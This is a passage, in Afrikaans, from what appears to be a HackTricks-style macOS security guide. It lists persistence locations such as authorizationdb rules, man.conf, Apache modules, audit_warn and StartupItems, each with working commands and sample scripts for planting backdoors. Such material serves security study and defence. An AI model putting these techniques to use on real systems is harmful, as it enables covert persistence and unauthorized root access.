security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sal vir die magtigingsraamwerk aandui dat dit **’n eksterne meganisme vir magtiging moet aanroep**. Boonop sal **`privileged`** veroorsaak dat dit deur root uitgevoer word.

Aktiveer dit met:
```bash
security authorize com.asdf.asdf
```
En dan behoort die **staff group** sudo-toegang te hê (lees `/etc/sudoers` om dit te bevestig).

### Man.conf

Uiteensetting: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en die gebruiker moet man gebruik
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
- Root vereis
- **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & Exploit

Die konfigurasielêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik moet word wanneer man-dokumentasielêers oopgemaak word. Die pad na die executable kan dus gewysig word sodat ’n backdoor uitgevoer word wanneer die gebruiker man gebruik om dokumentasie te lees.<sup>[[31]](#references)</sup>

Stel byvoorbeeld die volgende in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
En skep dan `/tmp/view` as:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en apache moet loop
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd het nie entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
- Root word vereis
- Sneller: Wanneer Apache2 begin word

#### Beskrywing & Exploit

Jy kan in `/etc/apache2/httpd.conf` aandui dat 'n module gelaai moet word deur 'n reël soos die volgende by te voeg:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste ding is dat jy dit óf met ’n geldige Apple-sertifikaat moet **sign**, óf ’n nuwe vertroude sertifikaat by die stelsel moet **voeg** en dit daarmee moet **sign**.

Dan, indien nodig, om seker te maak dat die bediener gestart sal word, kan jy uitvoer:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kodevoorbeeld vir die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM-ouditraamwerk

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees, auditd moet loop en 'n waarskuwing veroorsaak
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
- Root word vereis
- **Sneller**: Wanneer auditd 'n waarskuwing bespeur

#### Beskrywing & Exploit

Wanneer auditd 'n waarskuwing bespeur, word die script **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou payload daarby voeg.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Jy kan 'n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is afgekeur, dus behoort niks in daardie gidse gevind te word nie.**

Die **StartupItem** is 'n gids wat binne óf `/Library/StartupItems/` óf `/System/Library/StartupItems/` geplaas behoort te word. Sodra hierdie gids geskep is, moet dit twee spesifieke lêers bevat:

1. 'n **rc script**: 'n Shell-script wat tydens opstart uitgevoer word.
2. 'n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan nie hierdie komponent in my macOS vind nie, so kyk na die writeup vir meer inligting

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond**, wat deur Apple bekendgestel is, is ’n logging-meganisme wat blykbaar onderontwikkeld of moontlik verlate is, maar steeds toeganklik bly. Alhoewel dit nie besonder nuttig vir ’n Mac-administrateur is nie, kan hierdie obskure diens as ’n subtiele persistence-metode vir threat actors dien, wat waarskynlik deur die meeste macOS-admins ongemerk sal bly.<sup>[[34]](#references)</sup>

Vir diegene wat van die bestaan daarvan bewus is, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek na scripts om in ’n enkele gids uit te voer. Om dit te inspekteer, kan die volgende command gebruik word:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root vereis
- **Sneller**: Met XQuartz

#### Beskrywing & Exploit

XQuartz word **nie meer in macOS geïnstalleer nie**, dus, indien jy meer inligting wil hê, lees die skrywe.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die installering van ’n kext is so ingewikkeld, selfs as root, dat dit nie as ’n praktiese sandbox-escape- of persistence-tegniek beskou word nie, tensy jy ’n exploit het.

#### Ligging

Om ’n KEXT as ’n startup item te installeer, moet dit **in een van die volgende liggings geïnstalleer word**:

- `/System/Library/Extensions`
- KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
- `/Library/Extensions`
- KEXT-lêers wat deur derdeparty-sagteware geïnstalleer is

Jy kan tans gelaaide kext-lêers lys met:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Vir meer inligting oor [**kernel extensions kyk na hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Ligging

- **`/usr/local/bin/amstoold`**
- Root vereis

#### Beskrywing & Exploitation

Blykbaar het die `plist` vanaf `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit ’n XPC service blootgestel het... die ding is dat die binary nie bestaan het nie, dus kon jy iets daar plaas en wanneer die XPC service called word, sou jou binary called word.<sup>[[35]](#references)</sup>

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root vereis
- **Trigger**: Wanneer die service run word (selde)

#### Beskrywing & exploit

Blykbaar is dit nie baie algemeen om hierdie script te run nie en ek kon dit nie eens in my macOS vind nie, dus as jy meer inligting wil hê, kyk na die writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS-weergawes nie**

Dit is ook moontlik om hier **commands te plaas wat tydens startup uitgevoer sal word.** Voorbeeld van ’n gewone rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Volhardingstegnieke en -nutsmiddels

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Buiten die goeie ou LaunchAgents - 1 - shell-opstartlêers](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Buiten die goeie ou LaunchAgents - 18 - X11 en XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Buiten die goeie ou LaunchAgents - 21 - Heropende toepassings](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Buiten die goeie ou LaunchAgents - 20 - Terminal-voorkeure](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Buiten die goeie ou LaunchAgents - 13 - Oudio-inproppe](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Oudio-eenheid-inproppe (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Buiten die goeie ou LaunchAgents - 12 - QuickLook-inproppe](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Buiten die goeie ou LaunchAgents - 22 - LoginHook en LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Buiten die goeie ou LaunchAgents - 4 - cron-take](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Buiten die goeie ou LaunchAgents - 2 - iTerm2-opstart](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Buiten die goeie ou LaunchAgents - 7 - xbar-inproppe](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Buiten die goeie ou LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Buiten die goeie ou LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Buiten die goeie ou LaunchAgents - 3 - Aanmelditems](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Buiten die goeie ou LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Buiten die goeie ou LaunchAgents - 24 - Voueraksies](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Voueraksies vir volharding op macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Buiten die goeie ou LaunchAgents - 27 - Dock-kortpaaie](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Buiten die goeie ou LaunchAgents - 17 - Kleurkiesers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Buiten die goeie ou LaunchAgents - 26 - Finder Sync-inproppe](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ontleding van "Mac File Opener"-volharding (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Buiten die goeie ou LaunchAgents - 16 - Skermbewaarder](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Behoud jou toegang: Skermbewaarders vir macOS-volharding (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Buiten die goeie ou LaunchAgents - 11 - Spotlight-invoerders](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Buiten die goeie ou LaunchAgents - 9 - Voorkeurepaneel](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Buiten die goeie ou LaunchAgents - 19 - Periodieke skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Buiten die goeie ou LaunchAgents - 5 - Inpropbare verifikasiemodules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Buiten die goeie ou LaunchAgents - 28 - Magtigingsinproppe](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Volgehoue geloofsbriefdiefstal met magtigingsinproppe (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Buiten die goeie ou LaunchAgents - 30 - Die man-konfigurasielêer - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Buiten die goeie ou LaunchAgents - 25 - Apache2-modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Buiten die goeie ou LaunchAgents - 31 - BSM-ouditraamwerk](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Buiten die goeie ou LaunchAgents - 23 - emond, die gebeurtenismonitordaemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Buiten die goeie ou LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Buiten die goeie ou LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
